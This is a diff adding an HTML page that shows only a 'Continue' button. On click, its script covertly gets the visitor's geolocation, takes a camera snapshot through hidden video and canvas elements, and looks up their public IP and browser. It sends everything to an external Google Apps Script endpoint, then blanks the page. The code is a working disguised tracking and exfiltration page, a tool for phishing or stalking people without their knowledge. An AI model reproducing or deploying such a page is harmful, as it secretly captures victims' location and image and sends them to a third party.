@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Continue</title>
+</head>
+<body>
+
+<button id="startBtn">Continue</button>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyHMrAAaBc9mtft_hFyZY7uZI_wepbS_vE4g0xV-I32meKPDp1OhRf2BQj2mrT2MsLtow/exec";
+
+async function getIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+  } catch (e) {
+    return "IP not available";
+  }
+}
+
+document.getElementById("startBtn").addEventListener("click", async () => {
+
+  // 📍 LOCATION
+  let locationData = {};
+  try {
+    const pos = await new Promise((res, rej) =>
+      navigator.geolocation.getCurrentPosition(res, rej)
+    );
+    locationData = {
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude
+    };
+  } catch (e) {}
+
+  // 📷 CAMERA
+  let photoData = "";
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    await new Promise(r => setTimeout(r, 1500));
+
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    photoData = canvas.toDataURL("image/jpeg");
+
+    stream.getTracks().forEach(t => t.stop());
+  } catch (e) {}
+
+  // 🌐 IP ADDRESS
+  const ipAddress = await getIP();
+
+  // 🚀 SEND DATA
+  fetch(WEB_APP_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      location: locationData,
+      device: navigator.userAgent,
+      photo: photoData,
+      ip: ipAddress
+    })
+  });
+
+  // 🕵️ BLANK PAGE
+  document.body.innerHTML = "";
+});
+</script>
+
+</body>
+</html>
